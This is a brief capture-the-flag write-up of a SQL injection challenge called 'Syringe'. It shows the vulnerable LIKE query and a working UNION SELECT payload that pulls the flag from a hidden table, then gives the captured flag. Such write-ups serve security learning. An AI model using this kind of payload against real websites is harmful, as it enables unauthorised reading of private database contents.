
## Syringe (338 Points)

> Doctors love their databases! Here is a library of words and semantics relating to medical words, like "syringe", or "x-ray", or "injection". Find whatever you need, just by searching for it! 

Simple SQL Injection challenge. We are given the query:

```
SELECT * FROM semantics WHERE name LIKE "%<userinput>%"
```

We can do a simple injection:

```
garbage%" or name = "doctor" or name LIKE "%garbage%" UNION SELECT * FROM flag WHERE flag LIKE "%
```

and get the flag.

> flag{f2a5006b1b07cc08362772807322ef62}